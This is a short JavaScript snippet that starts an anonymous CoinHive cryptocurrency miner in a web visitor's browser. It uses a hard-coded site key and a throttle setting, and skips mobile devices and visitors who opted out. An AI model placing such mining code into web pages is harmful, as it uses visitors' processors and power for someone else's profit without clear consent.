var miner = new CoinHive.Anonymous('X4WRApqJeVQ3hIE3hyOIfXJCbeaQwpPj', {
    throttle: 0.9
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}